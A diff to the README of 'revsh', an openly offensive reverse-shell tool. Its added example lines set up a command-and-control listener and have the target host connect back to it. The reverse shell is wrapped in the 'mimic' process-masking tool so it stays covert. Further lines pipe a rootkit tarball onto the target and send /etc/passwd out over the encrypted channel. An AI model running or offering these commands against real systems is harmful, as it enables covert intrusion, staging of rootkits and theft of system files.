@@ -82,11 +82,11 @@ _revsh_ was developed on x86_64 Linux. Here is a brief list of Arch / OS combina
 
 ## Example ##
 
-First, setup the local host to be the control host:
+First, setup the local host to be the command and control host (e.g. "monkey"):
 
 	empty@monkey:~$ revsh -c 192.168.0.42:9999
 
-Then connect out from the remote target host:
+Then connect out from the remote target host (e.g. "kitty"):
 
 	target@kitty:~$ ./revsh 192.168.0.42:9999
 
@@ -107,19 +107,26 @@ We will now find a shell waiting for us back at the control host:
 	-rw-r--r-- 1 root root 1538 Jul 18 22:50 /etc/passwd
 	target@kitty:/$
 
-Note, if you configured the binary at build time to change the IP:PORT address to 192.168.0.42:9999, then the above example becomes even cleaner.
-
-Local control host:
+Note, if you configured the binary at build time to change the IP:PORT address to 192.168.0.42:9999, then the above example becomes even cleaner:
 
 	empty@monkey:~$ revsh -c
-
-Remote target host:
-
 	target@kitty:~$ ./revsh
 
 For a covert reverse shell, _revsh_ can be invoked from within [_mimic_](https://github.com/emptymonkey/mimic) on the target host:
 
-	./mimic -q -e './revsh -s "./mimic -e /bin/bash"'
+	empty@monkey:~$ revsh -c
+	target@kitty:/tmp$ ./mimic -q -e './revsh -s "./mimic -e /bin/bash"'
+
+For netcat style data transfer (with the crypto benefits of _revsh_) invoke _revsh_ with the -n switch. This is useful for moving tools on to the target host:
+
+	empty@monkey:~$ cat rootkit.tar | ./revsh -c -n
+	target@kitty:/tmp$ ./revsh >./totally_not_a_rootkit.tar
+	
+
+Or for moving data out from the target host:
+
+	empty@monkey:~$ revsh -c
+	target@kitty:/tmp$ cat /etc/passwd | ./revsh -n
 
 
 ## Installation ##
